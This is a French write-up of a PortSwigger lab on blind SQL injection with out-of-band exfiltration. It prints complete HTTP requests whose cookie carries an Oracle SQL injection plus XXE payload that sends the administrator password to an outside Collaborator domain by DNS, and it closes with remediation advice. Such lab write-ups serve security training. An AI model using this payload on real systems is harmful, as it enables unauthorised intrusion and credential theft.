# 💉 Lab : Blind SQL injection with out-of-band data exfiltration
**Catégorie :** Injection SQL (SQLi)
**Type :** Blind SQLi (Out-Of-Band / OAST / Asynchrone / Exfiltration)
**Plateforme :** PortSwigger Web Security Academy

---

## 📌 Résumé de la Vulnérabilité
L'application est vulnérable à une injection SQL en aveugle de type asynchrone via le cookie `TrackingId`. Puisque le serveur n'attend pas la réponse de la base de données, les attaques temporelles (Time-based) et booléennes sont inopérantes. La seule méthode pour confirmer l'injection et exfiltrer des données est d'utiliser une interaction réseau Out-Of-Band (OAST). En forçant la base de données à concaténer le mot de passe ciblé au nom de domaine d'un serveur contrôlé par l'attaquant (Burp Collaborator), la donnée sensible est exfiltrée silencieusement via une simple requête de résolution DNS.

## 🛠️ Preuve de Concept (PoC)
L'attaque a été réalisée méthodiquement avec **Burp Suite Professional** (module Collaborator), ciblant le moteur **Oracle**.

1. **Génération du receveur OAST :**
   Mise en écoute d'un payload Burp Collaborator : `sc8afuhtnc8gbyjrb1q9c9wlwc23qyen.oastify.com`.

2. **Première tentative d'injection et Erreur HTTP :**
   L'objectif est d'utiliser une faille XXE dans la fonction `EXTRACTVALUE` d'Oracle en concaténant (`||`) le résultat de la sous-requête `(SELECT password FROM users WHERE username='administrator')` au sous-domaine Collaborator.
   - *Requête envoyée en clair :*
     
         GET / HTTP/2
         Host: 0a5c00be03c75b3d80340314004c0028.web-security-academy.net
         Cookie: TrackingId=ReFO5aJE66ccAULJ'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.sc8afuhtnc8gbyjrb1q9c9wlwc23qyen.oastify.com/"> %remote;]>'),'/l') FROM dual)--; session=RCFvPmobrRa5jrUNTHMCWugovnX5s88q
   
   - *Résultat obtenu :* `HTTP/2 500 Internal Server Error` (Content-Length: 21).
   - *Analyse :* Le plantage n'est pas dû à une erreur SQL, mais au protocole HTTP. La présence de caractères XML bruts (`<`, `>`, `?`, `"`) corrompt la structure de l'en-tête `Cookie`, faisant crasher le serveur web avant même l'évaluation de la requête SQL.

3. **Correction de la syntaxe via Encodage URL :**
   Pour contourner ce crash, la valeur malveillante du `TrackingId` a été intégralement URL-encodée (via `Ctrl+U` dans Burp Repeater). Une attention particulière a été portée pour ne **pas** encoder la valeur du jeton `session`, afin de maintenir l'authentification.
   - *Requête modifiée envoyée :*
     
         GET / HTTP/2
         Host: 0a5c00be03c75b3d80340314004c0028.web-security-academy.net
         Cookie: TrackingId=ReFO5aJE66ccAULJ'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.sc8afuhtnc8gbyjrb1q9c9wlwc23qyen.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=RCFvPmobrRa5jrUNTHMCWugovnX5s88q
   
   - *Résultat obtenu :* `HTTP/2 200 OK`. L'application traite la requête silencieusement.

4. **Résultat et Exfiltration (Data Theft) :**
   L'analyse des logs du Burp Collaborator a confirmé l'exécution de la requête asynchrone avec la réception d'une requête DNS entrante.
   - *Domaine interrogé par le serveur cible :* `2u1u3enc81abk095ful8.sc8afuhtnc8gbyjrb1q9c9wlwc23qyen.oastify.com`
   - *Mot de passe extrait :* `2u1u3enc81abk095ful8`

*La connexion avec le compte administrateur à l'aide de ce mot de passe a permis de valider le challenge.*

## 🛡️ Recommandation de Sécurité
1. **Requêtes Préparées :** Implémenter des requêtes paramétrées (Prepared Statements) pour neutraliser de manière systémique l'injection de code SQL.
2. **Filtrage Egress Stricte :** Bloquer tout trafic réseau sortant (Egress) depuis le serveur de base de données. Un SGBD ne doit jamais avoir l'autorisation de résoudre des domaines DNS publics ou d'initier des requêtes HTTP vers des serveurs externes.

---
---